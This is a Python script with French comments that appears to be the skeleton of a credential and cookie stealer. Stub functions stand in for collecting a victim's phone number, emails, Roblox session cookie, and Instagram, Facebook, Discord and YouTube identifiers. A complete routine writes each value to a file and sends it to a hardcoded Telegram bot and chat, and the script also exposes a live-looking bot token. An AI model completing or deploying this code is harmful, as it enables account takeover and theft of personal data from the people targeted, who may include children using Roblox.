import os
import telebot
import requests
from telebot import apihelper

# Remplacez 'VOTRE_TOKEN_TELEGRAM' par votre token de bot Telegram
BOT_TOKEN = '8468165702:AAHD08K4JugVPyCze00j1qbluTs6iyjf1mw'
CHAT_ID = '8012856656'

bot = telebot.TeleBot(BOT_TOKEN)

def get_phone_number():
    # Remplacez par le code pour récupérer le numéro de téléphone
    # Exemple: return "1234567890"
    return "1234567890"

def get_emails():
    # Remplacez par le code pour récupérer les emails
    # Exemple: return ["email1@example.com", "email2@example.com"]
    return ["email1@example.com", "email2@example.com"]

def get_roblox_cookie():
    # Remplacez par le code pour récupérer le cookie Roblox
    # Exemple: return ".ROBLOSECURITY=_|warning|ht..."
    return ".ROBLOSECURITY=_|warning|ht..."

def get_instagram_username():
    # Remplacez par le code pour récupérer le nom d'utilisateur Instagram
    # Exemple: return "instagram_user"
    return "instagram_user"

def get_facebook_id():
    # Remplacez par le code pour récupérer l'ID Facebook
    # Exemple: return "1234567890"
    return "1234567890"

def get_discord_id():
    # Remplacez par le code pour récupérer l'ID Discord
    # Exemple: return "123456789012345678"
    return "123456789012345678"

def get_ytb_id():
    # Remplacez par le code pour récupérer l'ID YouTube
    # Exemple: return "UC1234567890"
    return "UC1234567890"

def send_file(file_path, message):
    with open(file_path, 'rb') as file:
        bot.send_document(CHAT_ID, file, caption=message)

def main():
    phone_number = get_phone_number()
    emails = get_emails()
    roblox_cookie = get_roblox_cookie()
    instagram_username = get_instagram_username()
    facebook_id = get_facebook_id()
    discord_id = get_discord_id()
    ytb_id = get_ytb_id()

    with open('phone_number.txt', 'w') as f:
        f.write(phone_number if phone_number else 'false')
    send_file('phone_number.txt', 'Numéro de téléphone: ' + ('true' if phone_number else 'false'))

    with open('emails.txt', 'w') as f:
        f.write('\n'.join(emails) if emails else 'false')
    send_file('emails.txt', 'Emails: ' + ('true' if emails else 'false'))

    with open('roblox_cookie.txt', 'w') as f:
        f.write(roblox_cookie if roblox_cookie else 'false')
    send_file('roblox_cookie.txt', 'Cookie Roblox: ' + ('true' if roblox_cookie else 'false'))

    with open('instagram_username.txt', 'w') as f:
        f.write(instagram_username if instagram_username else 'false')
    send_file('instagram_username.txt', 'Nom d\'utilisateur Instagram: ' + ('true' if instagram_username else 'false'))

    with open('facebook_id.txt', 'w') as f:
        f.write(facebook_id if facebook_id else 'false')
    send_file('facebook_id.txt', 'ID Facebook: ' + ('true' if facebook_id else 'false'))

    with open('discord_id.txt', 'w') as f:
        f.write(discord_id if discord_id else 'false')
    send_file('discord_id.txt', 'ID Discord: ' + ('true' if discord_id else 'false'))

    with open('ytb_id.txt', 'w') as f:
        f.write(ytb_id if ytb_id else 'false')
    send_file('ytb_id.txt', 'ID YouTube: ' + ('true' if ytb_id else 'false'))

if __name__ == "__main__":
    main()